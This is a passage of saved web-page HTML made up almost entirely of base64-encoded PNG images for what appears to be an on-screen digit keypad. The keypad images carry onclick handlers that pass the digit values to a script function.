e3pzAVQRhw729vQyWlpYk6WFkYGAQev36Nc3yCbx5M/LyCbkAAAAA//9ihLZt+Glk/r////9/ZFm4cGGvkZFRARMTE9Vt+P79OwMjI6M4i7q6uoK2tjZtvAHJSywkt01Iiguo2UwMdAAstE6+DLBGIq0toU9w0cMnRLepnz17xrB37144//79+wx1dXXUjXhJSUmGmJgYOH/r1q0E9cF9Qk7qOnr0KIOXlxfRljCRUvnA8L59+4hWS3bq0tTUpG1mPH/+PIOTkxPRjQiygmvr1q0M/Pz8JAUXyfkEZgHNcvz169cZgoKCSI5DkoJr27ZtDBISEiQFL8kRX1hYSFLQ0reApEd9MuqTQVjHT58+vaG/v1+ZFk2jL1++PGJgYPgEYMeMXRMGojD+kwoJJKJ0c+jQLSf6B5hJXV06uxYnIbt/ixSks7NOySJk1S7xHxCEdshgQRJI7Cqohba5q2n95rt73H3ve+99VwBuhBD3juM8GoZxJ3MOyxpxHG/n8/nzeDx+KQC3rus+1ev1B9M0yRPiOGa9Xm8bjYZVBDBNk1KphCxDJwu6rlMul9UpUemIKtszyqomSmujMkZUuPgrI7/JSBiGBEHw6ZparXby3/+7jEgRe6VSwbbts+bM931s2/5xvMP9SlMrDEM8z6Pb7ea7/E4mE4QQCCEyiSU9tU7B9302mw29Xi+zOMovstvtcF2XTqeDrutSLqJEI7PZjGq1erYA5EIji8WCIAgYDAaZn3+UWjI7u+d5NJvNL32PXJxGptMpmqbRarWkPJISjaxWK5bLJe12O99jvGVZDIfDow58HRr/i7G6OsRLw5/SSBJF0VseUytNU5IkeQXSwmg0ot/vFwED0HJGRAK87/f76GMA1p2GzVsKcSgAAAAASUVORK5CYII="><img data-savepage-currentsrc="5.png" onclick="accumulateValues('5')" data-savepage-src="/tra_cosmos_img/Images-pave-digital/5.png" src="data:image/png;base64,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"><img data-savepage-currentsrc="vide.png" data-savepage-src="/tra_cosmos_img/Images-pave-digital/vide.png" src="data:image/png;base64,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"><img data-savepage-currentsrc="8.png" onclick="accumulateValues('8')" data-savepage-src="/tra_cosmos_img/Images-pave-digital/8.png" src="data:image/png;base64,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